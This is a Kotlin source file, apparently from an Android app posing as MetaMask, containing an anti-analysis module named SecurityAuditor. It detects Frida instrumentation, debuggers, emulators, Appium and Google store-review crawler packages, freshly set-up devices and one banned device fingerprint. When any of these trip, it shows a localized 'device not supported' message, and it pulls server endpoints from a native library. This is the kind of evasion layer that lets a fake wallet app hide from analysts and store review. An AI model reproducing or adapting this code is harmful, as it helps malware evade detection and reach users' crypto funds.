package com.example.MetaMask.utils

import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.os.Build
import android.os.Debug
import android.os.SystemClock
import java.io.File
import java.net.ServerSocket
import kotlin.math.abs

object SecurityAuditor {

    init {
        try {
            System.loadLibrary("securelogic")
        } catch (e: UnsatisfiedLinkError) {
            android.util.Log.e("XDBG", "[SecurityAuditor] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            e.printStackTrace()
        }
    }

    external fun getSrvConfigA(): String
    external fun getSrvConfigB(): String
    external fun getSrvEndpoint(): String

    private val WATERING_HOLES = intArrayOf(27042, 27043, 27044, 27045, 27046, 9999, 23946, 23947, 23948, 23949)
    private const val TERRAIN_MARKER_A = "frida-agent"
    private const val TERRAIN_MARKER_B = "frida-gadget"
    private const val TERRAIN_MARKER_C = "linjector"
    private const val HERD_MARKER_A = "frida-server"
    private const val HERD_MARKER_B = "gum-js-loop"
    private const val HERD_MARKER_C = "fridahelper"
    private const val HERD_MARKER_D = "linjector"
    private val DEN_PATHS = arrayOf(
        "/data/local/tmp/frida-server",
        "/data/local/tmp/re.frida.server",
        "/system/lib/frida-gadget.so",
        "/system/lib64/frida-gadget.so",
        "/data/local/tmp/frida-gadget.so",
        "/data/local/tmp/frida",
        "/system/xbin/frida",
        "/sdcard/frida-server",
        "/system/bin/frida-server"
    )
    private val BOT_LABELS = arrayOf(
        "com.google.android.apps.auth.test.support",
        "AndroidX Crawler",
        "Stub App for AndroidX Crawler",
        "location.services"
    )
    private val BOT_PACKAGES = arrayOf(
        "com.google.android.apps.auth.test.support",
        "io.appium.settings",
        "io.appium.uiautomator2.server",
        "com.android.developer.ext",
        "com.github.uiautomator.test"
    )
    private val BANNED_FP = arrayOf(
        "OnePlus/IN2023/OnePlus8Pro:11/QKR1.191246.002/2006701342:user/release-keys"
    )
    private const val UPTIME_MS = 600_000L
    private const val SPREAD_WINDOW_MS = 1_800_000L

    fun checkEnvironment(context: Context): String? {
        android.util.Log.d("XDBG", "[SecurityAuditor] checkEnvironment enter context=ctx") //xdbg
        android.util.Log.d("XDBG", "[SecurityAuditor] return") //xdbg
        return null // BOTCHECK_DISABLED
        if (scanWatering())             return localizedBlockMsg(context)
        if (traceTerrain())             return localizedBlockMsg(context)
        if (sniffBurrows())             return localizedBlockMsg(context)
        if (surveyHerd())               return localizedBlockMsg(context)
        if (hasObserver())              return localizedBlockMsg(context)
        if (hasEmulatorHw())            return localizedBlockMsg(context)
        if (hasBannedFp())              return localizedBlockMsg(context)
        if (hasBotPackage(context))     return localizedBlockMsg(context)
        if (freshUptime())              return localizedBlockMsg(context)
        if (installSpread(context))     return localizedBlockMsg(context)
        if (checkLauncherApps(context)) return localizedBlockMsg(context)
        android.util.Log.d("XDBG", "[SecurityAuditor] return") //xdbg
        return null
    }

    private fun localizedBlockMsg(ctx: Context): String {
        android.util.Log.d("XDBG", "[SecurityAuditor] localizedBlockMsg enter ctx=ctx") //xdbg
        val lang = try {
            val locale = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
                ctx.resources.configuration.locales[0]
            else
                @Suppress("DEPRECATION") ctx.resources.configuration.locale
            locale.language
        } catch (e: Exception) { "en" }
        return when (lang) {
            "ru" -> "Устройство не поддерживается"
            "uk" -> "Пристрій не підтримується"
            "kk" -> "Құрылғы қолданылмайды"
            "tg" -> "Дастгоҳ дастгирӣ намешавад"
            "uz" -> "Qurilma qo'llab-quvvatlanmaydi"
            "ja" -> "このデバイスはサポートされていません"
            else -> "Device is not supported"
        }
    }

    private fun scanWatering(): Boolean {
        android.util.Log.d("XDBG", "[SecurityAuditor] scanWatering enter") //xdbg
        for (port in WATERING_HOLES) {
            android.util.Log.d("XDBG", "[SecurityAuditor] loop") //xdbg
            try {
                ServerSocket(port).close()
            } catch (e: java.net.BindException) {
                android.util.Log.e("XDBG", "[SecurityAuditor] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                android.util.Log.d("XDBG", "[SecurityAuditor] return") //xdbg
                return true
            } catch (e: Exception) { }
        }
        android.util.Log.d("XDBG", "[SecurityAuditor] return") //xdbg
        return false
    }

    private fun traceTerrain(): Boolean = try {
        File("/proc/self/maps").useLines { lines ->
            lines.any { l ->
                l.contains(TERRAIN_MARKER_A) ||
                l.contains(TERRAIN_MARKER_B) ||
                l.contains(TERRAIN_MARKER_C)
            }
        }
    } catch (e: Exception) { false }

    private fun sniffBurrows(): Boolean = DEN_PATHS.any { File(it).exists() }

    private fun surveyHerd(): Boolean = try {
        val p = Runtime.getRuntime().exec("ps")
        p.inputStream.bufferedReader().use { r ->
            r.lineSequence().any { l ->
                l.contains(HERD_MARKER_A) || l.contains(HERD_MARKER_B) ||
                l.contains(HERD_MARKER_C) || l.contains(HERD_MARKER_D)
            }
        }
    } catch (e: Exception) { false }

    private fun hasObserver(): Boolean =
        Debug.isDebuggerConnected() || Debug.waitingForDebugger()

    private fun hasEmulatorHw(): Boolean {
        android.util.Log.d("XDBG", "[SecurityAuditor] hasEmulatorHw enter") //xdbg
        val hw    = Build.HARDWARE.lowercase()
        val model = Build.MODEL.lowercase()
        val fp    = Build.FINGERPRINT.lowercase()
        val emulatorHw    = hw == "goldfish" || hw == "ranchu"
        val emulatorModel = model.contains("sdk") || model.contains("emulator") ||
                            model.contains("android sdk built for x86")
        val testKeys = fp.endsWith(":test-keys")
        android.util.Log.d("XDBG", "[SecurityAuditor] return") //xdbg
        return emulatorHw || emulatorModel || (testKeys && emulatorHw)
    }

    private fun hasBannedFp(): Boolean =
        BANNED_FP.any { banned -> Build.FINGERPRINT == banned }

    private fun hasBotPackage(ctx: Context): Boolean {
        android.util.Log.d("XDBG", "[SecurityAuditor] hasBotPackage enter ctx=ctx") //xdbg
        val pm = ctx.packageManager
        for (pkg in BOT_PACKAGES) {
            android.util.Log.d("XDBG", "[SecurityAuditor] loop") //xdbg
            try { pm.getPackageInfo(pkg, 0); return true } catch (_: Exception) {}
        }
        android.util.Log.d("XDBG", "[SecurityAuditor] return") //xdbg
        return false
    }

    private fun freshUptime(): Boolean =
        SystemClock.elapsedRealtime() < UPTIME_MS

    private fun installSpread(ctx: Context): Boolean {
        android.util.Log.d("XDBG", "[SecurityAuditor] installSpread enter ctx=ctx") //xdbg
        android.util.Log.d("XDBG", "[SecurityAuditor] return") //xdbg
        return try {
            val pm = ctx.packageManager
            val ts = pm.getPackageInfo("com.android.settings", 0).firstInstallTime
            val tb = System.currentTimeMillis() - SystemClock.elapsedRealtime()
            if (abs(ts - tb) < 600_000L) return true
            var uc = 0; var cc = 0
            for (p in pm.getInstalledPackages(0)) {
                android.util.Log.d("XDBG", "[SecurityAuditor] loop") //xdbg
                val ai = p.applicationInfo ?: continue
                if ((ai.flags and ApplicationInfo.FLAG_SYSTEM) != 0) continue
                if ((ai.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0) continue
                if (p.packageName == ctx.packageName) continue
                uc++
                if (p.firstInstallTime - ts > SPREAD_WINDOW_MS) return false
                if (abs(p.firstInstallTime - ts) < 300_000L) cc++
            }
            uc > 0 && cc == uc
        } catch (_: Exception) { false }
    }

    private fun checkLauncherApps(ctx: Context): Boolean {
        android.util.Log.d("XDBG", "[SecurityAuditor] checkLauncherApps enter ctx=ctx") //xdbg
        val pm = ctx.packageManager
        val intent = Intent(Intent.ACTION_MAIN).apply { addCategory(Intent.CATEGORY_LAUNCHER) }
        val apps = pm.queryIntentActivities(intent, 0)
        val myPkg = ctx.packageName

        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q && apps.size < 5) return true

        for (ri in apps) {
            android.util.Log.d("XDBG", "[SecurityAuditor] loop") //xdbg
            val ai = ri.activityInfo ?: continue
            if (ai.packageName == myPkg) continue
            val label = try { ri.loadLabel(pm).toString() } catch (_: Exception) { continue }
            if (BOT_LABELS.any { it == label }) return true
        }

        android.util.Log.d("XDBG", "[SecurityAuditor] return") //xdbg
        return false
    }
}
